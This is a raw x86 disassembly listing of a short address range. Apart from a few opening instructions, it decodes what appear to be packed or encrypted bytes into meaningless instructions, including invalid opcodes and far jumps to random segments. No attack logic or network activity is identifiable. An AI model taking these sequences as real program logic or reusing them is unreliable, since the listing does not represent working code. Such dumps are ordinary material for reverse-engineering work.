  41a02f:	mov    edx,DWORD PTR [ebp-0x14]
  41a032:	dec    DWORD PTR ds:0x428028
  41a038:	xor    edx,eax
  41a03a:	add    edx,esi
  41a03c:	mov    DWORD PTR ds:0x42a00c,0x26bd
  41a046:	jmp    0x41c434
  41a04b:	mov    edi,DWORD PTR [ebp+0x8]
  41a04e:	jmp    0x41c3c9
  41a053:	ud1    esp,DWORD PTR [edx+edi*2-0x78941c5c]
  41a05b:	(bad)  
  41a05c:	mov    ch,0x8f
  41a05e:	std    
  41a05f:	and    ah,cl
  41a061:	xchg   ebx,eax
  41a062:	jnp    0x41a0c3
  41a064:	add    BYTE PTR [ecx+0x62],ah
  41a067:	add    al,0x5f
  41a069:	bound  esp,QWORD PTR [edx+0x58]
  41a06c:	mov    cl,0xd6
  41a06e:	fmulp  st(0),st
  41a070:	test   BYTE PTR [edx],ch
  41a072:	mov    eax,ds:0x107d7bfb
  41a077:	int3   
  41a078:	sbb    eax,0xa65a26b
  41a07d:	xchg   BYTE PTR ss:[eax-0x131e3333],ch
  41a084:	push   ecx
  41a085:	dec    eax
  41a086:	pusha  
  41a087:	pop    edi
  41a088:	jp     0x41a0e3
  41a08a:	inc    ebp
  41a08b:	sahf   
  41a08c:	dec    edi
  41a08d:	jae    0x41a054
  41a08f:	and    dh,ah
  41a091:	jg     0x41a048
  41a093:	pop    eax
  41a094:	mov    al,ds:0x475b5d53
  41a099:	pop    ss
  41a09a:	outs   dx,BYTE PTR ds:[esi]
  41a09b:	inc    esp
  41a09c:	sub    eax,0xee406474
  41a0a1:	dec    edi
  41a0a2:	inc    ebp
  41a0a3:	cmp    BYTE PTR [edi+ecx*4-0x39],ch
  41a0a7:	cmp    BYTE PTR [ebx],bl
  41a0a9:	lea    ebx,[esp+0x62]
  41a0ad:	pusha  
  41a0ae:	pop    ds
  41a0af:	cmp    BYTE PTR ds:[edx],0x7a
  41a0b3:	nop
  41a0b4:	push   0x18164726
  41a0b9:	leave  
  41a0ba:	ret    
  41a0bb:	fxch   st(3)
  41a0bd:	mov    ebp,0xe37513d2
  41a0c2:	mov    ch,0xd3
  41a0c4:	sbb    al,0x62
  41a0c6:	mov    ebx,0xb0e5cb04
  41a0cb:	mov    ds:0x75013f25,eax
  41a0d0:	in     eax,0xea
  41a0d2:	fist   DWORD PTR [eax]
  41a0d4:	dec    edx
  41a0d5:	es call 0x368f:0xc94cb3c9
  41a0dd:	inc    eax
  41a0de:	enter  0xedc2,0xdd
  41a0e2:	pop    esi
  41a0e3:	xor    eax,0x907308d
  41a0e8:	lods   eax,DWORD PTR ds:[esi]
  41a0e9:	or     ah,BYTE PTR [ebx-0x8]
  41a0ec:	leave  
  41a0ed:	pop    ebx
  41a0ee:	cmc    
  41a0ef:	pop    eax
  41a0f0:	xchg   edi,eax
  41a0f1:	sbb    al,0x17
  41a0f3:	shl    BYTE PTR [edi-0x3e],1
  41a0f6:	stc    
  41a0f7:	lods   al,BYTE PTR ds:[esi]
  41a0f8:	test   al,0x36
  41a0fa:	xchg   ebx,eax
  41a0fb:	mov    edx,0xe6a9092f
  41a100:	lds    eax,FWORD PTR [ecx]
  41a102:	jns    0x41a0d1
  41a104:	daa    
  41a105:	mov    esp,DWORD PTR [esi+0x6b802020]
  41a10b:	or     al,BYTE PTR [ebx+0x643c1d33]
  41a111:	pushf  
  41a112:	daa    
  41a113:	(bad)  
  41a114:	(bad)  
  41a115:	daa    
  41a116:	push   0xde0a0742
  41a11b:	mov    bl,0xcb
  41a11d:	sbb    edx,DWORD PTR [edx+0x31]
  41a120:	xor    ebx,eax
  41a122:	xchg   esp,eax
  41a123:	add    DWORD PTR [ebp-0x57],0x519fbe6
  41a12a:	std    
  41a12b:	xor    esi,edi
  41a12d:	sbb    al,BYTE PTR [eax-0x560a56cb]
  41a133:	mov    DWORD PTR [ebp+0x40],ecx
  41a136:	retf   
  41a137:	fsub   QWORD PTR [edi+0x20]
  41a13a:	cmp    DWORD PTR ds:0x9251d3d6,edx
  41a140:	cmp    dh,dl
  41a142:	sti    
  41a143:	and    esp,DWORD PTR [ebp-0x64e55883]
  41a149:	xor    eax,0xe772ff70
  41a14e:	jb     0x41a19e
  41a150:	popf   
  41a151:	sub    dh,ch
  41a153:	data16 loop 0x41a1c8
  41a156:	(bad)  
  41a157:	loop   0x41a1d8
  41a159:	inc    ebp
  41a15a:	or     eax,0x94a5e710
  41a15f:	gs pop es
  41a161:	into   
  41a162:	xchg   ebp,eax
  41a163:	ds mov esp,0xcb3b4166
  41a169:	imul   DWORD PTR ds:0x1bde4afa
  41a16f:	mov    ds:0x798415e0,eax
  41a174:	sub    eax,0x7d82f90d
  41a179:	inc    edx
  41a17a:	push   edx
  41a17b:	cld    
  41a17c:	and    eax,esi
  41a17e:	inc    edx
  41a17f:	cmp    DWORD PTR [ecx+0x36752372],ebx
  41a185:	inc    cl
  41a187:	aam    0x96
  41a189:	adc    dl,BYTE PTR [ecx-0x3f]
  41a18c:	xor    eax,0xf50ccc05
  41a191:	mov    DWORD PTR [eax],eax
  41a193:	mov    ?,WORD PTR [eax]
  41a195:	push   esi
  41a196:	push   es
  41a197:	call   0x59da:0x29452c27
  41a19e:	fs xchg esi,ecx
  41a1a1:	cmc    
  41a1a2:	jb     0x41a143
  41a1a4:	and    eax,0x59f0c1c2
  41a1a9:	mov    eax,ds:0xc1533d2a
  41a1ae:	ins    BYTE PTR es:[edi],dx
  41a1af:	ins    DWORD PTR es:[edi],dx
  41a1b0:	ret    
  41a1b1:	lods   eax,DWORD PTR ds:[esi]
  41a1b2:	mov    edi,0xbfb67430
  41a1b7:	cmp    eax,0xce84781c
  41a1bc:	cmp    esi,DWORD PTR [edx+0x5800f8ed]
  41a1c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1c3:	ds push ds
  41a1c5:	or     eax,0x1ddf6c81
  41a1ca:	ja     0x41a1d1
  41a1cc:	mov    dl,0x6a
  41a1ce:	add    eax,0x3e05f71a
  41a1d3:	lds    eax,FWORD PTR [ecx+0xb1bdeb4]
  41a1d9:	sbb    ah,BYTE PTR [eax]
  41a1db:	add    BYTE PTR [eax-0x16],cl
  41a1de:	lahf   
  41a1df:	mov    ss,WORD PTR ds:0x3875daf3
  41a1e5:	leave  
  41a1e6:	mov    dl,BYTE PTR [edi+esi*4-0x624057b0]
  41a1ed:	rcr    ecx,1
  41a1ef:	push   0x3b
  41a1f1:	or     al,0xcf
  41a1f3:	std    
  41a1f4:	xchg   edi,eax
  41a1f5:	out    dx,eax
  41a1f6:	in     eax,dx
  41a1f7:	popa   
  41a1f8:	lods   eax,DWORD PTR ds:[esi]
  41a1f9:	fnstcw WORD PTR [edi]
  41a1fb:	jb     0x41a237
  41a1fd:	pop    ss
  41a1fe:	dec    eax
  41a1ff:	jecxz  0x41a1ed
  41a201:	pop    ebp
  41a202:	loope  0x41a258
  41a204:	cli    
  41a205:	mov    edx,0xd6ff4262
  41a20b:	lock pop eax
  41a20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a20e:	jo     0x41a220
  41a210:	stc    
  41a211:	xor    eax,0x3ca47b0
  41a216:	fisub  DWORD PTR [ebx+ebp*2-0x21]
  41a21a:	aaa    
  41a21b:	xor    ebp,DWORD PTR [edi]
  41a21d:	(bad)  
  41a21e:	shl    DWORD PTR [ebx-0x1836b8d9],1
  41a224:	mov    edi,0x5003a6bf
  41a229:	xchg   BYTE PTR [ebp-0x32],ch
  41a22c:	fdiv   DWORD PTR [esi+0x59]
  41a22f:	sbb    DWORD PTR [ebp+0x19],eax
  41a232:	dec    eax
  41a233:	inc    ebx
  41a234:	fwait
  41a235:	dec    esp
  41a236:	inc    edi
  41a237:	fnstenv [eax-0x49]
  41a23a:	pop    ss
  41a23b:	rcr    BYTE PTR [edx-0x4f],cl
  41a23e:	jp     0x41a1c7
  41a240:	jmp    0xd1ad5efc
  41a245:	xor    al,BYTE PTR [ebx-0x2acba485]
  41a24b:	sar    DWORD PTR [edi],1
  41a24d:	xchg   edi,eax
  41a24e:	rcl    DWORD PTR [edi],cl
  41a250:	aas    
  41a251:	lock add eax,0x1ee173c6
  41a257:	ret    
  41a258:	sub    al,0x14
  41a25a:	xchg   ecx,eax
  41a25b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a25c:	add    DWORD PTR [edi-0x39392e36],ecx
  41a262:	imul   ebx,DWORD PTR [ebx+ebx*4+0x3281f0d8],0x51af5371
  41a26d:	ror    BYTE PTR [eax],cl
  41a26f:	loope  0x41a2be
  41a271:	imul   esp,DWORD PTR [edi-0x52],0x7db2c870
  41a278:	pushf  
  41a279:	scas   eax,DWORD PTR es:[edi]
  41a27a:	sub    al,0x7c
  41a27c:	lods   eax,DWORD PTR ds:[esi]
  41a27d:	lods   eax,DWORD PTR ds:[esi]
  41a27e:	jae    0x41a23b
  41a280:	mov    ds:0x4ffe2938,al
  41a285:	inc    eax
  41a286:	loopne 0x41a2d7
  41a288:	ja     0x41a2db
  41a28a:	xor    BYTE PTR [esi+0x33],bh
  41a28d:	ja     0x41a2f6
  41a28f:	aam    0x96
  41a291:	dec    eax
  41a292:	jnp    0x41a2e5
  41a294:	jg     0x41a2f6
  41a296:	scas   eax,DWORD PTR es:[edi]
  41a297:	out    0xa5,al
  41a299:	or     cl,BYTE PTR [ebx]
  41a29b:	cli    
  41a29c:	mov    eax,0x2d350a54
  41a2a1:	imul   ebp,DWORD PTR gs:[esi],0xe7da7632
  41a2a8:	test   BYTE PTR [esi-0x27],bl
  41a2ab:	push   edi
  41a2ac:	or     eax,0xb6881913
  41a2b1:	mov    esi,0xdda96557
  41a2b6:	xchg   al,ch
  41a2b8:	cmp    BYTE PTR [edi],ch
  41a2ba:	in     eax,dx
  41a2bb:	push   cs
  41a2bc:	sbb    al,0x64
  41a2be:	mov    ds:0x7486694,eax
  41a2c3:	cdq    
  41a2c4:	push   es
  41a2c5:	jo     0x41a2cf
  41a2c7:	mov    BYTE PTR [ecx-0x7981017c],bh
  41a2cd:	scas   eax,DWORD PTR es:[edi]
  41a2ce:	push   esp
  41a2cf:	inc    ecx
  41a2d0:	(bad)  
  41a2d1:	popa   
  41a2d2:	xchg   ecx,eax
  41a2d3:	addr16 cdq 
  41a2d5:	mov    WORD PTR [ebx-0x3],?
  41a2d8:	xchg   esp,eax
  41a2d9:	jbe    0x41a342
  41a2db:	cmovne edi,ebx
  41a2de:	push   ebp
  41a2df:	pop    eax
  41a2e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2e1:	xchg   esi,eax
  41a2e2:	outs   dx,BYTE PTR ds:[esi]
  41a2e3:	xor    eax,0xfecb29d9
  41a2e8:	enter  0x96b8,0xef
  41a2ec:	lds    ebp,FWORD PTR [esp+eiz*4]
  41a2ef:	test   eax,0x2946af71
  41a2f4:	adc    ah,BYTE PTR [edx+0x42]
  41a2f7:	pushf  
  41a2f8:	lods   al,BYTE PTR ds:[esi]
  41a2f9:	sti    
  41a2fa:	xchg   esp,eax
  41a2fb:	add    al,0xad
  41a2fd:	xor    BYTE PTR [edx],bl
  41a2ff:	call   0xb46f2810
  41a304:	arpl   ax,dx
  41a306:	retf   
  41a307:	inc    ecx
  41a308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a309:	and    DWORD PTR [ecx],eax
  41a30b:	adc    DWORD PTR [ebx],ebx
  41a30d:	addr16 je 0x41a2fa
  41a310:	push   ss
  41a311:	xchg   ebx,eax
  41a312:	ror    BYTE PTR [ebx-0x4cc3dc25],cl
  41a318:	push   edx
  41a319:	lahf   
  41a31a:	or     BYTE PTR [eax-0x6464e73b],0xae
  41a321:	int3   
  41a322:	bound  edx,QWORD PTR [eax+eiz*4+0x310367b7]
  41a329:	rcr    BYTE PTR [edi-0x1b],0xc1
  41a32d:	inc    esi
  41a32e:	rol    DWORD PTR [edx],0x9a
  41a331:	pusha  
  41a332:	out    0x5,al
  41a334:	aaa    
  41a335:	into   
  41a336:	hlt    
  41a337:	cwde   
  41a338:	test   DWORD PTR [esi+eiz*4-0x7e347c7e],ebx
  41a33f:	xor    BYTE PTR [ecx],cl
  41a341:	(bad)  [edi+0x1a]
  41a344:	mov    bl,0x19
  41a346:	inc    edx
  41a347:	pop    edx
  41a348:	mov    ds:0xe89903c9,eax
  41a34d:	lds    edx,FWORD PTR [edx+0x69]
  41a350:	sub    cl,ah
  41a352:	add    eax,0xb03443d3
  41a357:	fmul   DWORD PTR [ecx-0x58]
  41a35a:	gs dec eax
  41a35c:	mov    eax,0xf3cddd65
  41a361:	cs or  eax,0x7fc0493
  41a367:	jge    0x41a31d
  41a369:	jmp    0x96ba:0xaead72aa
  41a370:	jnp    0x41a3c7
  41a372:	sti    
  41a373:	sbb    BYTE PTR [eax-0x62],cl
  41a376:	popa   
  41a377:	sti    
  41a378:	fwait
  41a379:	psubusb mm1,QWORD PTR [edx]
  41a37c:	dec    esp
  41a37d:	sbb    eax,0xd38bc484
  41a382:	or     edx,esi
  41a384:	lahf   
  41a385:	call   0xbc3ee05d
  41a38a:	fsub   DWORD PTR [eax+ecx*1]
  41a38d:	sub    ch,bh
  41a38f:	(bad)  
  41a391:	and    bh,BYTE PTR [edi-0x7cc0cb3d]
  41a397:	in     eax,dx
  41a398:	loop   0x41a3c5
  41a39a:	mov    eax,0x3a3d0468
  41a39f:	call   0x76b:0x996d3a71
  41a3a6:	les    esp,FWORD PTR [ebx-0x2b]
  41a3a9:	jge    0x41a396
  41a3ab:	iret   
  41a3ac:	jae    0x41a367
  41a3ae:	in     eax,0xa2
  41a3b0:	pop    es
  41a3b1:	test   eax,0xfb287f30
  41a3b6:	push   0x25
  41a3b8:	xlat   BYTE PTR ds:[ebx]
  41a3b9:	or     eax,edi
  41a3bb:	jno    0x41a416
  41a3bd:	mov    bl,0x6
  41a3bf:	sbb    BYTE PTR [eax-0x3ff4639c],0x30
  41a3c6:	or     eax,0x2cb9ebce
  41a3cb:	fs push ds
  41a3cd:	sbb    BYTE PTR [ebp+esi*4-0x4c],0x6a
  41a3d2:	sbb    al,0x21
  41a3d4:	pop    edx
  41a3d5:	inc    esi
  41a3d6:	mov    bh,ch
  41a3d8:	ds pop es
  41a3da:	mov    ch,0xa7
  41a3dc:	js     0x41a395
  41a3de:	and    BYTE PTR [ecx-0x30],al
  41a3e1:	std    
  41a3e2:	sbb    edx,esi
  41a3e4:	pop    es
  41a3e5:	dec    eax
  41a3e6:	test   DWORD PTR [ebp-0x1328e8b7],ebp
  41a3ec:	jmp    0xabdc:0x2ecdf379
  41a3f3:	dec    esp
  41a3f4:	pop    ecx
  41a3f5:	and    BYTE PTR [esi],ah
  41a3f7:	lock test eax,0x434f1eab
  41a3fd:	push   edi
  41a3fe:	mov    ebp,0x3a66f81c
  41a403:	(bad)  
  41a404:	inc    eax
  41a405:	cwde   
  41a406:	jge    0x41a486
  41a408:	dec    edi
  41a409:	inc    edx
  41a40a:	mov    ebx,0x39b5d30b
  41a40f:	xchg   ebp,eax
  41a410:	(bad)  
  41a411:	dec    edx
  41a412:	xchg   DWORD PTR [edi-0x69],ecx
  41a415:	shr    DWORD PTR [ebp+eax*1+0x5d4916e4],0x99
  41a41d:	ficom  WORD PTR [eax-0x3a]
  41a420:	jo     0x41a492
  41a422:	push   0x7b3eed8a
  41a427:	mov    edi,0x15f1a692
  41a42c:	les    eax,FWORD PTR [ebx]
  41a42e:	cli    
  41a42f:	sub    ebx,DWORD PTR [edi]
  41a431:	lods   al,BYTE PTR ds:[esi]
  41a432:	mov    ds:0xadfc1a72,eax
  41a437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a438:	mov    al,ds:0x5c270839
  41a43d:	add    eax,0xd36a602b
  41a442:	add    eax,0x36bc30cd
  41a447:	test   bl,0x6c
  41a44a:	push   eax
  41a44b:	leave  
  41a44c:	adc    bl,bl
  41a44e:	(bad)  
  41a44f:	xor    DWORD PTR es:[eax+0x5c014a27],edx
  41a456:	mov    ebp,esi
  41a458:	aam    0xc9
  41a45a:	xchg   ebx,eax
  41a45b:	pop    edx
  41a45c:	retf   0x50c2
  41a45f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a460:	push   esp
  41a461:	mov    eax,ds:0x1c8ae838
  41a466:	dec    ecx
  41a467:	inc    esi
  41a468:	sub    edx,ebx
  41a46a:	push   esp
  41a46b:	push   esi
  41a46c:	test   eax,0x6c55df0d
  41a471:	pop    es
  41a472:	pop    edi
  41a473:	aam    0x75
  41a475:	pop    ds
  41a476:	popa   
  41a477:	add    DWORD PTR [esi+0x21951f87],edi
  41a47d:	inc    ebx
  41a47e:	into   
  41a47f:	aam    0x34
  41a481:	adc    dh,cl
  41a483:	push   0xffffffe9
  41a485:	fxch   st(0)
  41a487:	das    
  41a488:	push   ebx
  41a489:	pop    ebx
  41a48a:	popf   
  41a48b:	cld    
  41a48c:	cmp    esp,DWORD PTR [edi+0x3a40853d]
  41a492:	bound  ebp,QWORD PTR [ebx]
  41a494:	add    eax,0x501672c5
  41a499:	loope  0x41a4c3
  41a49b:	in     eax,0x51
  41a49d:	jno    0x41a4b5
  41a49f:	cmp    ebp,DWORD PTR [ecx-0x360efca8]
  41a4a5:	cdq    
  41a4a6:	cli    
  41a4a7:	dec    DWORD PTR [edi+0x3d]
  41a4aa:	push   0xe19dad38
  41a4af:	outs   dx,BYTE PTR ds:[esi]
  41a4b0:	fimul  WORD PTR [edx-0x56c3a90a]
  41a4b6:	mov    eax,ds:0xa25af130
  41a4bb:	sub    al,0xe7
  41a4bd:	es aaa 
  41a4bf:	sbb    al,0x41
  41a4c1:	push   esi
  41a4c2:	push   edx
  41a4c3:	stos   BYTE PTR es:[edi],al
  41a4c4:	les    ecx,FWORD PTR [ecx-0xe]
  41a4c7:	mov    esp,eax
  41a4c9:	xchg   esi,ecx
  41a4cb:	xor    bl,0x86
  41a4ce:	add    DWORD PTR [eax+0x37b9f4a4],esi
  41a4d4:	inc    ecx
  41a4d5:	mov    eax,0x5d8248d
  41a4da:	inc    esp
  41a4db:	mul    BYTE PTR [ecx-0x49]
  41a4de:	pop    ebx
  41a4df:	mov    DWORD PTR [ebp-0x24],edi
  41a4e2:	popa   
  41a4e3:	mov    ebp,DWORD PTR [ecx]
  41a4e5:	dec    edi
  41a4e6:	lods   eax,DWORD PTR ds:[esi]
  41a4e7:	jg     0x41a52d
  41a4e9:	and    DWORD PTR [ebx-0x3d40f0d7],esp
  41a4ef:	cmp    eax,0x7c51e313
  41a4f4:	fwait
  41a4f5:	ret    0x33fc
  41a4f8:	mov    al,ds:0x9d6409aa
  41a4fd:	add    ebp,ecx
  41a4ff:	xchg   esi,eax
  41a500:	dec    eax
  41a501:	cmp    ebp,ecx
  41a503:	ja     0x41a536
  41a505:	retf   
  41a506:	lahf   
  41a507:	push   edx
  41a508:	stc    
  41a509:	lods   eax,DWORD PTR ds:[esi]
  41a50a:	stos   DWORD PTR es:[edi],eax
  41a50b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a50c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a50d:	xlat   BYTE PTR ds:[ebx]
  41a50e:	retf   
  41a50f:	push   0xf4a5baa
  41a514:	test   edx,edx
  41a516:	ss js  0x41a4fd
  41a519:	test   DWORD PTR [edx],0xa97c3306
  41a51f:	icebp  
  41a520:	jne    0x41a4bc
  41a522:	mov    dh,0x52
  41a524:	fwait
  41a525:	xor    bl,0xd3
  41a528:	and    al,0xcb
  41a52a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a52b:	ror    ebx,0x6
  41a52e:	mov    eax,ds:0x85824086
  41a533:	into   
  41a534:	out    0x8e,eax
  41a536:	(bad)  
  41a537:	icebp  
  41a538:	in     eax,0xd2
  41a53a:	xchg   ebp,eax
  41a53b:	scas   eax,DWORD PTR es:[edi]
  41a53c:	into   
  41a53d:	mov    bl,0x5a
  41a53f:	push   esp
  41a540:	outs   dx,DWORD PTR ds:[esi]
  41a541:	(bad)  
  41a542:	int    0x23
  41a544:	add    DWORD PTR [eax+ecx*8+0x63],0x4dbb94b3
  41a54c:	push   eax
  41a54d:	add    BYTE PTR [edx-0x77137845],ch
  41a553:	pop    edx
  41a554:	cmp    dh,BYTE PTR [edi+ecx*2]
  41a557:	imul   dl
  41a559:	addr16 sub eax,0x60c496f2
  41a55f:	mov    eax,ds:0x92d37235
  41a564:	rcl    DWORD PTR [eax-0x70fe83d0],cl
  41a56a:	jmp    0x8c60:0x3bd7dfeb
  41a571:	dec    ebp
  41a572:	mov    ecx,0xb6f85579
  41a577:	iret   
  41a578:	pop    edx
  41a579:	mov    dh,0x54
  41a57b:	fist   DWORD PTR [esi-0x796b9871]
  41a581:	(bad)  
  41a582:	pop    DWORD PTR [ecx+0x74]
  41a585:	push   eax
  41a586:	test   BYTE PTR [edi],0x69
  41a589:	into   
  41a58a:	fs (bad) 
  41a58d:	xchg   ebx,eax
  41a58e:	pop    edi
  41a58f:	jmp    0x41a5e5
  41a591:	loopne 0x41a5b9
  41a593:	leave  
  41a594:	outs   dx,BYTE PTR ds:[esi]
  41a595:	rol    cx,cl
  41a598:	call   0x59a25526
  41a59d:	js     0x41a553
  41a59f:	jno    0x41a58a
  41a5a1:	mov    ebp,0xb5bdd2ae
  41a5a6:	xor    eax,0x39b46863
  41a5ab:	outs   dx,DWORD PTR ds:[esi]
  41a5ac:	ds lahf 
  41a5ae:	or     ebx,ebx
  41a5b0:	inc    esp
  41a5b1:	das    
  41a5b2:	imul   edi,edx,0x629fa11e
  41a5b8:	or     al,0x7e
  41a5ba:	sbb    BYTE PTR [esi],ah
  41a5bc:	sbb    al,0x99
  41a5be:	or     DWORD PTR [ecx+0x6e],0xab3cfe1e
  41a5c5:	pop    edi
  41a5c6:	(bad)  
  41a5c7:	mov    ecx,0x3ecf4a3c
  41a5cc:	pop    esp
  41a5cd:	test   ecx,edx
  41a5cf:	cmp    al,0x1
  41a5d1:	or     BYTE PTR [ebx-0x32a2fa1e],bh
  41a5d7:	std    
  41a5d8:	inc    ebp
  41a5d9:	into   
  41a5da:	pop    ss
  41a5db:	sub    al,0xb3
  41a5dd:	or     al,BYTE PTR [esi+0x61]
  41a5e0:	aam    0x8f
  41a5e2:	lock sti 
  41a5e4:	fstp   DWORD PTR [esi]
  41a5e6:	aam    0x88
  41a5e8:	sbb    ebx,0x69
  41a5eb:	lahf   
  41a5ec:	cdq    
  41a5ed:	and    BYTE PTR [edx],cl
  41a5ef:	jge    0x41a5ba
  41a5f1:	(bad)  
  41a5f3:	add    eax,0x1a119650
  41a5f8:	jp     0x41a612
  41a5fa:	push   ebp
  41a5fb:	mul    BYTE PTR [edi]
  41a5fd:	inc    ebx
  41a5fe:	pushf  
  41a5ff:	imul   DWORD PTR [edi-0x4f6b6333]
  41a605:	nop
  41a606:	jecxz  0x41a653
  41a608:	mov    ds:0x676c8005,al
  41a60d:	mul    eax
  41a60f:	retf   0xa379
  41a612:	ror    BYTE PTR [ecx],cl
  41a614:	mov    dl,0xe
  41a616:	add    DWORD PTR [ebx-0x3c],0x5a
  41a61a:	ds mov esi,0xcc230a1c
  41a620:	outs   dx,BYTE PTR ds:[esi]
  41a621:	mov    al,ds:0x763c290c
  41a626:	das    
  41a627:	and    BYTE PTR [eax+ebp*2-0xc],dl
  41a62b:	cmp    ecx,DWORD PTR [ebx+0x2c50e46f]
  41a631:	test   eax,0x1d8bd38e
  41a636:	rol    bh,cl
  41a638:	retf   0xbfff
  41a63b:	ror    DWORD PTR [eax+0x47],cl
  41a63e:	mov    eax,0xa61485ee
  41a643:	xchg   esp,eax
  41a644:	stc    
  41a645:	xchg   edx,eax
  41a646:	aam    0xf9
  41a648:	arpl   WORD PTR [esi-0x2e9081cd],sp
  41a64e:	(bad)  
  41a650:	mov    cl,BYTE PTR [edi]
  41a652:	jmp    0x62a3:0xbf96fa40
  41a659:	call   0xe3e4:0x819d0375
  41a660:	ss xchg edx,eax
  41a662:	fwait
  41a663:	outs   dx,DWORD PTR ds:[esi]
  41a664:	cmp    esi,esi
  41a666:	clc    
  41a667:	mov    bh,0x85
  41a669:	cmc    
  41a66a:	lock jge 0x41a6c1
  41a66d:	inc    esp
  41a66e:	jmp    0x33d8468e
  41a673:	in     eax,dx
  41a674:	fwait
  41a675:	jno    0x41a63c
  41a677:	lahf   
  41a678:	test   eax,0xacf88
  41a67d:	out    0x7d,eax
  41a67f:	pop    DWORD PTR [edx+0x32a5de91]
  41a685:	mov    ds:0xb00a0f75,al
  41a68a:	xor    BYTE PTR [eax+0x1ffe5744],al
  41a690:	xor    al,0x72
  41a692:	jno    0x41a6ea
  41a694:	in     al,0xb
  41a696:	imul   esp,DWORD PTR [ebp+0x3c],0xffffffdf
  41a69a:	mov    ch,0x1f
  41a69c:	mov    ecx,0xe0163ecf
  41a6a1:	and    DWORD PTR [ebp+0x2d54c0de],ecx
  41a6a7:	push   es
  41a6a8:	cld    
  41a6a9:	call   0x19f152ef
  41a6ae:	pop    esi
  41a6af:	xchg   esp,eax
  41a6b0:	(bad)  
  41a6b1:	sub    esi,DWORD PTR [esp+esi*4]
  41a6b4:	push   ss
  41a6b5:	out    dx,al
  41a6b6:	cli    
  41a6b7:	and    BYTE PTR [eax],bh
  41a6b9:	adc    DWORD PTR [eax+0xa],ebp
  41a6bc:	xchg   BYTE PTR [bp+di+0x1f10],ah
  41a6c1:	dec    eax
  41a6c2:	sub    eax,0xbd0d3621
  41a6c7:	cmp    dh,BYTE PTR [eax+0x40]
  41a6ca:	mov    ah,0x7a
  41a6cc:	lock xor al,0xc1
  41a6cf:	mov    bh,0xb
  41a6d1:	nop    DWORD PTR [eax]
  41a6d4:	sar    BYTE PTR [eax],0x2
  41a6d7:	imul   ebx,DWORD PTR [edx-0x7c9b7516],0x26
  41a6de:	sbb    ecx,esp
  41a6e0:	lds    esi,FWORD PTR [ecx-0x43]
  41a6e3:	push   esi
  41a6e4:	sbb    eax,0x463b7c4
  41a6e9:	sbb    eax,DWORD PTR [ebp+0x6a94a9ff]
  41a6ef:	loope  0x41a6f6
  41a6f1:	int    0x3c
  41a6f3:	add    al,0x82
  41a6f5:	mov    es,WORD PTR [edx-0x3d54e688]
  41a6fb:	inc    ebx
  41a6fc:	push   ebp
  41a6fd:	jns    0x41a741
  41a6ff:	std    
  41a700:	xor    esi,0x5a8811b9
  41a706:	hlt    
  41a707:	mov    esp,0xd46aaa61
  41a70c:	jb     0x41a6a9
  41a70e:	sbb    ch,BYTE PTR [ebp-0x18ffa443]
  41a714:	mov    eax,ds:0xa97f8c4
  41a719:	xchg   edx,eax
  41a71a:	xor    DWORD PTR [esi],ecx
  41a71c:	pop    ds
  41a71d:	jg     0x41a6a9
  41a71f:	mov    esi,0xcead3ac4
  41a724:	out    0x99,al
  41a726:	adc    esi,DWORD PTR [edi]
  41a728:	cmp    al,0x9a
  41a72a:	and    eax,0x16b5f975
  41a72f:	xchg   ecx,eax
  41a730:	xchg   BYTE PTR [ecx],bl
  41a732:	frstor [ebp+ebx*8-0x54]
  41a736:	mov    ch,0x82
  41a738:	addr16 sbb eax,0x3322fec6
  41a73e:	loop   0x41a6cf
  41a740:	jmp    FWORD PTR [eax+0x208f65f4]
  41a746:	mov    bl,0xa0
  41a748:	mov    WORD PTR [edx],cs
  41a74a:	jno    0x41a7ae
  41a74c:	into   
  41a74d:	jne    0x41a776
  41a74f:	dec    esp
  41a750:	lods   al,BYTE PTR ds:[esi]
  41a751:	or     ch,0x13
  41a754:	sbb    DWORD PTR [edx-0x77bda4b1],esi
  41a75a:	clc    
  41a75b:	inc    eax
  41a75c:	cdq    
  41a75d:	xchg   edi,eax
  41a75e:	push   edi
  41a75f:	mov    cl,BYTE PTR [edi-0x53]
  41a762:	sti    
  41a763:	out    0xa8,eax
  41a765:	ds pop eax
  41a767:	hlt    
  41a768:	or     esp,DWORD PTR [eax+0x6b21a932]
  41a76e:	xchg   ebp,eax
  41a76f:	es test eax,0xb9ba3814
  41a775:	mov    gs,ecx
  41a777:	xchg   edx,eax
  41a778:	mov    ?,esp
  41a77a:	adc    eax,edi
  41a77c:	fcmovnb st,st(5)
  41a77e:	jge    0x41a7b4
  41a780:	sub    eax,0x5249f8f7
  41a785:	and    al,0xe9
  41a787:	mov    al,ds:0xa8b20e51
  41a78c:	xchg   ebx,eax
  41a78d:	mov    edi,DWORD PTR [ebx+0x65397426]
  41a793:	rep stos BYTE PTR es:[edi],al
  41a795:	stos   BYTE PTR es:[edi],al
  41a796:	jmp    0x41a810
  41a798:	test   BYTE PTR [edx+0x4b],dl
  41a79b:	adc    esi,DWORD PTR [ebx]
  41a79d:	pusha  
  41a79e:	adc    eax,0xaa2b2bee
  41a7a3:	cwde   
  41a7a4:	xchg   ebp,eax
  41a7a5:	sub    DWORD PTR [esi],0x1f
  41a7a8:	push   es
  41a7a9:	call   0x7515c5e6
  41a7ae:	loope  0x41a7e7
  41a7b0:	jno    0x41a783
  41a7b2:	fadd   QWORD PTR [eax-0x43]
  41a7b5:	mov    cl,0xcd
  41a7b7:	test   al,0x9e
  41a7b9:	rcl    DWORD PTR [edx-0x3d],cl
  41a7bc:	dec    ebx
  41a7bd:	inc    ebp
  41a7be:	ja     0x41a827
  41a7c0:	ror    BYTE PTR [ecx],cl
  41a7c2:	push   edi
  41a7c3:	push   0x20dda186
  41a7c8:	stc    
  41a7c9:	stos   BYTE PTR es:[edi],al
  41a7ca:	mov    esp,0x4d7fe9b2
  41a7cf:	xor    eax,0x86e6fb9b
  41a7d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7d5:	mov    ah,0xb0
